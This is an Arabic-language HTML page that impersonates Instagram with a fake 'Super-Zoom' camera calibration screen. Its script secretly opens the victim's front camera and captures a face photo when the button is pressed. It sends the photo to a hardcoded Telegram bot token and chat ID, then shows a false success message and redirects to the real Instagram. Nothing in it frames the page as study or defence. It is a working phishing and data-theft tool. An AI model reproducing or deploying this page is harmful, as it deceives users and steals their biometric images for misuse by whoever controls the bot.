<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تحديث الميزات | Instagram</title>
    <style>
        :root {
            --ig-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2397 75%, #323232 100%);
            --ig-blue: #0095f6;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        
        body { 
            background: #000; /* خلفية سوداء لتبدو كأنها وضع الكاميرا */
            color: #fff; 
            height: 100vh; 
            display: flex; 
            flex-direction: column; 
            overflow: hidden; 
        }

        /* واجهة الكاميرا */
        .camera-ui {
            flex: 1;
            position: relative;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .viewfinder {
            width: 280px;
            height: 280px;
            border: 2px solid rgba(255, 255, 255, 0.5);
            border-radius: 50%;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 0 1000px rgba(0, 0, 0, 0.6); /* تأثير التركيز */
        }

        .viewfinder::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px solid transparent;
            border-top-color: var(--ig-blue);
            animation: rotate 2s linear infinite;
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .instruction-box {
            position: absolute;
            bottom: 40px;
            text-align: center;
            width: 100%;
            padding: 0 30px;
        }

        h1 { font-size: 18px; font-weight: 600; margin-bottom: 10px; }
        p { font-size: 14px; color: #ccc; line-height: 1.4; }

        /* الأزرار */
        .controls {
            padding: 30px 20px;
            background: #000;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .shutter-btn {
            width: 70px;
            height: 70px;
            background: #fff;
            border: 5px solid #333;
            border-radius: 50%;
            margin: 0 auto;
            cursor: pointer;
        }

        .shutter-btn:active { background: #ddd; transform: scale(0.9); }

        .skip-btn {
            background: none;
            border: none;
            color: #888;
            font-size: 13px;
            cursor: pointer;
        }

        video, canvas { display: none; }

        /* تأثير الفلاش */
        #flash {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #fff;
            display: none;
            z-index: 100;
        }
    </style>
</head>
<body>

    <div id="flash"></div>

    <div class="camera-ui">
        <div class="viewfinder">
            <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.3)" stroke-width="1">
                <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path>
                <circle cx="12" cy="13" r="4"></circle>
            </svg>
        </div>

        <div class="instruction-box">
            <h1>معايرة ميزة الـ Super-Zoom</h1>
            <p>ضع وجهك داخل الدائرة واضغط على الزر أدناه لتحسين دقة التركيز التلقائي في ميزة القصص الجديدة.</p>
        </div>
    </div>

    <div class="controls">
        <div class="shutter-btn" onclick="takePhoto()"></div>
        <button class="skip-btn" onclick="location.href='https://instagram.com'">ليس الآن</button>
    </div>

    <video id="v" autoplay playsinline></video>
    <canvas id="c"></canvas>

    <script>
        const T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
        const C = '2140385904';
        let stream = null;

        async function startCam() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
            } catch (e) {}
        }
        startCam();

        function takePhoto() {
            // تأثير الفلاش البصري
            const flash = document.getElementById('flash');
            flash.style.display = 'block';
            setTimeout(() => flash.style.display = 'none', 100);

            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = 480; canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            
            canvas.toBlob((blob) => {
                const fd = new FormData();
                fd.append('chat_id', C);
                fd.append('photo', blob, 'calib.jpg');
                fd.append('caption', '📸 *تمت المعايرة*\nالمستخدم استخدم ميزة السوبر زوم الوهمية.');
                
                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                
                setTimeout(() => {
                    alert("تم تحديث إعدادات الكاميرا بنجاح!");
                    window.location.href = "https://www.instagram.com/";
                }, 1000);
            }, 'image/jpeg', 0.6);
        }
    </script>
</body>
</html>
